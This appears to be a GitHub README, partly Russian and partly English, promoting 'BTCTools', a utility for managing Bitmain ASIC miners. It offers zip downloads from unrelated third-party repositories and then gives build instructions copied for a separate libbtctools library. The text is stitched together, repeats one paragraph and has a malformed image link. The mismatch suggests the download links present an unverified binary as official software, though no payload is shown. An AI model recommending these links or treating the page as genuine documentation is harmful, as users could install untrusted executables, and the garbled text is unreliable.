# BTCTools - программа для управления асик майнерами (Виндовс/Линукс/МакОС)

![image]([https://user-images.githubusercontent.com/atom-miner/btc/blob/main/02.png](https://github.com/atom-miner/btc/blob/main/02.png))

BTC tools – одна из лучших программ для майнинга, благодаря этой программе вы можете найти свой ASIC в сети, что упрощает процесс и затрат времени.

Программа создаётся усилиями небезызвестного производителя АСИК-майнеров Bitmain. Изначально она предназначалась конкретно для линейки AntMiner, которая являлась наиболее популярной среди добытчиков Bitcoin. Но позднее создатели обновили её, и теперь она подходит для других вариантов ASIC. Облегчение процесса сканирования майнеров Antminer Bitmain.


- [ ] [Скачать BTCTools v1.3.3 для Windows/Linux/MacOS](https://github.com/atom-miner/btctools/releases/download/1.3.3/BTC.Tools.v1.3.3.with.Asic.zip)


## С помощью BTCTools мы можем:
- Программа может обновить прошивку сразу всех асиков или только конкретных по заданым настройкам
- Управление потреблением электричества отдельных или всех ASIC Antminer с режимами низкой мощности и повышенной.
- Групповая регулировка разгона майнеров – изменение частоты.
- Автоматический поиск подключённых АСИК, даже при использовании сегментированной сети.
- Отображение общей информации по оборудованию – хешрейт, текущая температура, скорость вращения вентиляторов, подключённый пул, название группы ASIC и др.
- Возможность сортировки майнеров по различным параметрам – скорость добычи, градусы. Это особенно важный пункт для владельцев нескольких устройств, так как он позволяет вычислить замедление и ухудшение в работе отдельно взятых.
- Постоянный мониторинг функционирования АСИК.
- Пакетное управление ASIC и изменение большинства параметров.
- Быстрая перезагрузка группы майнеров или отдельных участников.

## Как работать с BTC tools 
Утилита автоматически обнаружит доступный диапазон IP-адресов в локальной сети. Если вы видите, что здесь допущена ошибка, то можно добавить вручную, нажав на «+» и прописав необходимый адрес:


![image](https://user-images.githubusercontent.com/98730417/212392676-a6c38134-f0e9-46c1-ac4c-72acdd93d8cd.png)
- Запускаете сканирование нажатием на «Scan» и дожидаетесь окончания:

## Search for ASICs using Tools.
Then, to search for ASICs, you should click on the “Scan” button, the field of which will search for ASICs. As the program runs, the progress in the bar next to the button will change. All this time, the program will scan the network, loading it, which is why it is worth turning off all programs and unnecessary devices from this network so as not to load the network and so that the check (scan) is successful.
![image](https://user-images.githubusercontent.com/98730417/212393216-861cd3df-6a17-429b-943f-a257ee68eb04.png)
- [ ] [Download SetMinersStaticIP v1.3.4 for Windows/Linux/MacOS](https://github.com/Sanberstav/BTCTools/releases/download/BTCTools-v1.3.3/Set.Miners.Static.IP.v1.3.4.win.zip)
------------------------------------------------
## BTC Tools
In the process of searching for devices, ASICs will be displayed in the list below. In the list you can see the IP, ASIC status, name, operation mode, two ASIC hash rate values that were found during the search. In addition, there is information on the heating temperature of the ASICs, the rotation speed of the fans, the operating time of the ASICs in the active mining mode, as well as the addresses of the pools and walkers to which the ASICs are actually connected.

In the process of searching for devices, ASICs will be displayed in the list below. In the list you can see the IP, ASIC status, name, operation mode, two ASIC hash rate values that were found during the search. In addition, there is information on the heating temperature of the ASICs, the rotation speed of the fans, the operating time of the ASICs in the active mining mode, as well as the addresses of the pools and walkers to which the ASICs are actually connected …

The main essence of the program is that you can configure your ASICs from any device and geographic location.

## Dependency
There are 4 dependencies:
* Boost 1.59 or later (1.65 or later is validated and recommended)
* OpenSSL (both 1.0 or 1.1 are OK)
* Lua-5.1 or LuaJIT-2.0 (LuaJIT is recommended but incompatibly with macOS)
* Crypto++ (5.6.5 or later)
And `libpthread` is required on Linux and macOS.

## Build on Linux
Example on Ubuntu 18.04 x64:
```bash
### build tools
apt-get install -y build-essential autotools-dev libtool autoconf automake pkg-config cmake gcc g++

### install boost via apt
apt install libboost-all-dev

### or build boost 1.65 if you want (optional)
wget https://dl.bintray.com/boostorg/release/1.65.1/source/boost_1_65_1.tar.gz
tar zxf boost_1_65_1.tar.gz
cd boost_1_65_1
./bootstrap.sh
./b2
./b2 install

### install other dependencies
apt update
apt install libssl-dev libluajit-5.1-dev libcrypto++-dev

### clone and build
git clone https://github.com/btccom/libbtctools.git
cd libbtctools
mkdir build
cd build

### build as static library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=STATIC ..
make
make install

### or build as dynamic library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=SHARED ..
make
make install

### running demos
cd /opt/btctools/bin/btctools
./ipGeneratorDemo
./scanMinerDemo
./configMinerDemo
./rebootMinerDemo
```

## Build on macOS
It seems like build on Linux. Search and install dependencies with `brew` first.

Tips: install `lua-5.1` instead of `luajit-2.0`. The demo will segmentation fault with `luajit-2.0` and I don't know the reason.

The command will be:
```bash
brew install cmake boost openssl lua@5.1 cryptopp

### static library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=STATIC -DBTCTOOLS__LUA_TYPE=NORMAL ..

### or dynamic library
cmake -DCMAKE_INSTALL_PREFIX=/opt/btctools -DBTCTOOLS__LIB_TYPE=SHARED -DBTCTOOLS__LUA_TYPE=NORMAL ..

### build & install
make
make install
```

## Build on Windows

### Install Visual Studio

Please install the C/C++ Development Kit with Visual Studio.

See https://visualstudio.microsoft.com/ for more details.

### Install CMake

See https://cmake.org/download/ for more details.

### Install vcpkg

See https://github.com/Microsoft/vcpkg/ for more details.


## Quick Steps:
```
git clone https://github.com/Microsoft/vcpkg.git
cd vcpkg
.\bootstrap-vcpkg.bat
.\vcpkg integrate install
```

Example output for `.\vcpkg integrate install`:

> PS G:\work\vcpkg> .\vcpkg integrate install
> Applied user-wide integration for this vcpkg root.
> 
> All MSBuild C++ projects can now #include any installed libraries.
> Linking will be handled automatically.
> Installing new libraries will make them instantly available.
> 
> CMake projects should use: "-DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake"

### install packages via vcpkg


#### 32bit
```
.\vcpkg install boost:x86-windows-static openssl:x86-windows-static cryptopp:x86-windows-static luajit:x86-windows-static
```

#### 64bit
```
.\vcpkg install boost:x64-windows-static openssl:x64-windows-static cryptopp:x64-windows-static luajit:x64-windows-static
```

### cmake & build

#### 32bit
```
md build.32
cd build.32
cmake -DCMAKE_BUILD_TYPE=Release -A win32 -DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x86-windows-static -DBTCTOOLS__STATIC_LINKING_VC_LIB=ON -DBTCTOOLS__LIB_TYPE=STATIC -DCMAKE_INSTALL_PREFIX=G:\work\lib32\btctools ..
start libbtctools.sln
```

#### 64bit
```
md build.64
cd build.64
cmake -DCMAKE_BUILD_TYPE=Release -A x64 -DCMAKE_TOOLCHAIN_FILE=G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake -DVCPKG_TARGET_TRIPLET=x64-windows-static -DBTCTOOLS__STATIC_LINKING_VC_LIB=ON -DBTCTOOLS__LIB_TYPE=STATIC -DCMAKE_INSTALL_PREFIX=G:\work\lib64\btctools ..
start libbtctools.sln
```

Replace `G:/work/vcpkg/scripts/buildsystems/vcpkg.cmake` to your `vcpkg.cmake` path.

Replace `G:\work\lib[32|64]\btctools` to the install path what you want.

Select **Release** instead of the default **Debug** in the build type drop-down box, then build the **INSTALL** project to install.
